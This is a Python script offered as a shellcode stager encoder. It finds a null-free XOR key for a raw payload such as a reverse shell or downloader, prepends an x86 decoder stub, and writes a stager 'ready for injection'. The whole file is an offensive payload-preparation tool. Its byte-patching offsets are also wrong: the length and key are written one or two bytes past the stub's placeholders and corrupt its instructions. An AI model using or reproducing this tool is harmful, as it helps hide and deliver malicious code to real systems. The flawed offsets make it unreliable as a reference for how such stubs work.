#!/usr/bin/env python3
"""
swizBOT Stager Encoder
Based on Jake Swiz's "Fukahi Tekiō" methodology
Finds a safe XOR key and encodes your payload
"""

import sys
import struct

def find_safe_key_and_encode(shellcode_bytes):
    """Finds XOR key that produces no null bytes and isn't in original"""
    shellcode = bytearray(shellcode_bytes)
    
    for key in range(1, 256):
        encoded = bytearray([b ^ key for b in shellcode])
        
        # No null bytes in encoded AND key not in original shellcode
        if b'\x00' not in encoded and key not in shellcode:
            return key, encoded
    
    raise Exception("No safe XOR key found! Try smaller payload or different encoding.")

def build_stager(payload_path, output_path):
    """Builds the complete stager: decoder + encoded payload"""
    
    # Read the raw shellcode payload (e.g., downloader or reverse shell)
    with open(payload_path, 'rb') as f:
        payload = f.read()
    
    # Find safe XOR key and encode payload
    key, encoded = find_safe_key_and_encode(payload)
    length = len(payload)
    
    print(f"[+] Shellcode length: {length} bytes (0x{length:04x})")
    print(f"[+] Safe XOR key: 0x{key:02x}")
    
    # Base decoder stub (patch length and key)
    if length < 256:
        decoder = bytearray([
            0xEB, 0x0D,           # jmp short +13
            0x5E,                 # pop esi
            0x31, 0xC9,           # xor ecx, ecx
            0xB1, 0x00,           # mov cl, <length> - PATCH
            0x80, 0x36, 0x00,     # xor byte [esi], <key> - PATCH
            0x46,                 # inc esi
            0xE2, 0xFA,           # loop -6
            0xEB, 0x05,           # jmp short +5
            0xE8, 0xEE, 0xFF, 0xFF, 0xFF  # call -18
        ])
        decoder[7] = length        # Patch mov cl
    else:
        decoder = bytearray([
            0xEB, 0x0F,           # jmp short +15
            0x5E,                 # pop esi
            0x31, 0xC9,           # xor ecx, ecx
            0x66, 0xB9, 0x00, 0x00,  # mov cx, <length> - PATCH (LE)
            0x80, 0x36, 0x00,     # xor byte [esi], <key> - PATCH
            0x46,                 # inc esi
            0xE2, 0xFA,           # loop -6
            0xEB, 0x05,           # jmp short +5
            0xE8, 0xEC, 0xFF, 0xFF, 0xFF  # call -20
        ])
        # Patch length (little endian)
        decoder[8] = length & 0xFF
        decoder[9] = (length >> 8) & 0xFF
    
    decoder[11 if length < 256 else 12] = key  # Patch XOR key
    
    # Build final stager
    stager = decoder + encoded
    
    with open(output_path, 'wb') as f:
        f.write(stager)
    
    print(f"[+] Stager written to {output_path}")
    print(f"[+] Total size: {len(stager)} bytes")
    print(f"[+] Ready for injection!")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python encoder.py <raw_payload.bin> <output_stager.bin>")
        sys.exit(1)
    
    build_stager(sys.argv[1], sys.argv[2])
